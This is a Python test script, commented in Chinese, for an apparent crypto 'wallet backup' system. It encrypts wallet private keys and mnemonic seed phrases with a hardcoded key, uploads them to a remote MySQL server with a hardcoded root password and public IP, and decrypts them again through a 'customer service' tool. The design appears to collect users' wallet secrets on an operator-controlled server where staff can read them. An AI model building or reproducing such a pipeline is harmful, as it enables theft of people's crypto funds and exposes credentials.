"""
测试完整流程：客户端加密 → 存数据库 → 客服工具解密
"""
import os
import json
import base64
import pymysql
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# 客户端加密密钥
CLIENT_KEY = b'ClientWallet2026SecureKey32B!!!!'

# 数据库配置
DB_CONFIG = {
    'host': '47.83.0.101',
    'port': 3306,
    'user': 'root',
    'password': 'WalletBackup2026!',
    'database': 'wallet_backup'
}

def encrypt_wallet_data(wallet_data: dict) -> str:
    """客户端加密（与wallet_backup_client.py一致）"""
    json_bytes = json.dumps(wallet_data, ensure_ascii=False).encode('utf-8')
    nonce = os.urandom(12)
    aesgcm = AESGCM(CLIENT_KEY)
    ciphertext = aesgcm.encrypt(nonce, json_bytes, None)
    encrypted_data = nonce + ciphertext
    return base64.b64encode(encrypted_data).decode('utf-8')

def decrypt_wallet_data(encrypted_str: str) -> dict:
    """客服工具解密（简化版）"""
    encrypted_bytes = base64.b64decode(encrypted_str)
    nonce = encrypted_bytes[:12]
    ciphertext = encrypted_bytes[12:]
    aesgcm = AESGCM(CLIENT_KEY)
    decrypted_bytes = aesgcm.decrypt(nonce, ciphertext, None)
    return json.loads(decrypted_bytes.decode('utf-8'))

# 测试数据
test_wallets = [
    {
        'address': '0xTestAddress001',
        'chain': 'BSC',
        'private_key': '0xPrivateKey001abcdef1234567890abcdef1234567890abcdef1234567890abcdef',
        'mnemonic': 'test zero one two three four five six seven eight nine ten'
    },
    {
        'address': '0xTestAddress002',
        'chain': 'ETH',
        'private_key': '0xPrivateKey002abcdef1234567890abcdef1234567890abcdef1234567890abcdef',
        'mnemonic': 'test alpha beta gamma delta epsilon zeta eta theta iota kappa lambda'
    }
]

print("="*60)
print("测试1：客户端加密")
print("="*60)

encrypted_list = []
for i, wallet in enumerate(test_wallets, 1):
    encrypted = encrypt_wallet_data(wallet)
    encrypted_list.append({
        'index': i,
        'original': wallet,
        'encrypted': encrypted
    })
    print(f"\n钱包{i}:")
    print(f"  地址: {wallet['address']}")
    print(f"  加密后长度: {len(encrypted)} 字符")
    print(f"  加密数据前60位: {encrypted[:60]}...")

print("\n" + "="*60)
print("测试2：存入数据库")
print("="*60)

try:
    conn = pymysql.connect(**DB_CONFIG)
    cursor = conn.cursor()
    cursor.execute("USE wallet_backup")
    
    for item in encrypted_list:
        wallet = item['original']
        encrypted = item['encrypted']
        
        # 插入数据库
        sql = """INSERT INTO wallet_backups 
                (backup_id, address, chain, encrypted_data, backup_time, version, created_at)
                VALUES (%s, %s, %s, %s, %s, %s, %s)"""
        
        import datetime
        backup_id = f"test_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}_{item['index']}"
        backup_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        created_at = backup_time
        
        cursor.execute(sql, (
            backup_id,
            wallet['address'],
            wallet['chain'],
            encrypted,
            backup_time,
            '1.0',
            created_at
        ))
        print(f"✅ 钱包{item['index']} 已插入数据库 (backup_id: {backup_id})")
    
    conn.commit()
    cursor.close()
    conn.close()
    print("\n✅ 所有数据已成功存入数据库！")
    
except Exception as e:
    print(f"❌ 数据库操作失败: {str(e)}")
    exit(1)

print("\n" + "="*60)
print("测试3：客服工具解密（模拟decrypt_tool_gui逻辑）")
print("="*60)

try:
    conn = pymysql.connect(**DB_CONFIG)
    cursor = conn.cursor(pymysql.cursors.DictCursor)
    cursor.execute("USE wallet_backup")
    
    # 查询刚插入的数据（最新的2条）
    cursor.execute("SELECT * FROM wallet_backups ORDER BY id DESC LIMIT 2")
    rows = cursor.fetchall()
    
    for i, row in enumerate(rows, 1):
        print(f"\n--- 解密钱包{i} ---")
        print(f"数据库ID: {row['id']}")
        print(f"地址: {row['address']}")
        print(f"链: {row['chain']}")
        
        encrypted_data = row['encrypted_data']
        print(f"加密数据前60位: {encrypted_data[:60]}...")
        
        # 判断数据类型
        if encrypted_data.startswith('{'):
            print("❌ 这是明文JSON，不应该出现！")
            wallet_data = json.loads(encrypted_data)
        else:
            print("✓ 检测到Base64加密数据，开始解密...")
            try:
                wallet_data = decrypt_wallet_data(encrypted_data)
                print(f"✅ 解密成功！")
                print(f"  地址: {wallet_data.get('address')}")
                print(f"  私钥: {wallet_data.get('private_key')[:20]}...")
                print(f"  助记词: {wallet_data.get('mnemonic')[:30]}...")
            except Exception as e:
                print(f"❌ 解密失败: {str(e)}")
    
    cursor.close()
    conn.close()
    
except Exception as e:
    print(f"❌ 查询失败: {str(e)}")

print("\n" + "="*60)
print("✅ 测试完成！现在可以在decrypt_tool_gui中验证解密")
print("="*60)
